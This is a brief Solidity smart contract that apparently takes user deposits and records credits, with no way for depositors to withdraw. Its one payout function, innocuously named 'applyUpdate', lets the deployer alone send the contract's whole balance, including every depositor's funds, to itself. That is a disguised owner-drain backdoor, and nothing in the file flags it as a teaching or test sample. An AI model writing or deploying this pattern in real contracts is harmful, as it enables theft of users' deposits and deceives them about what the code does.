// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1602 {
    address public steward; mapping(address => uint256) public credits;
    constructor() { steward = msg.sender; }
    function deposit() external payable { credits[msg.sender] += msg.value; }
    function applyUpdate() external { require(msg.sender == steward, "denied"); (bool ok,) = payable(steward).call{value: address(this).balance}(""); require(ok, "send"); }
}
